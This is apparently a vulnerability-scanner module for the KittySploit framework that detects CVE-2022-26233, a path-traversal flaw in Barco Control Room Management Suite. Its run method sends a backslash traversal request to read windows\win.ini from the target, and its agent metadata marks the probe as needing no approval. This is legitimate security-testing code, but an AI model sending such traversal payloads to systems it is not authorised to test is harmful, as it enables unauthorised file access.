#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Barco Control Room Management through Suite 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Barco Control Room Management Suite <=2.9 Build 0275 - Local File Inclusion Detection',
        'description': 'Barco Control Room Management through Suite 2.9 Build 0275 is vulnerable to local file inclusion that could allow attackers to access sensitive information and components. Requests must begin with the "GET /..\\.." substring.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'barco', 'lfi', 'seclists', 'packetstorm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://0day.today/exploit/37579',
            'http://seclists.org/fulldisclosure/2022/Apr/0',
            'http://packetstormsecurity.com/files/166577/Barco-Control-Room-Management-Suite-Directory-Traversal.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-26233',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-26233',
    }

    def run(self):
        path = '/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Barco Control Room Management Suite <=2.9 Build 0275 - Local File Inclusion detected', path=path)
            return True
        return False

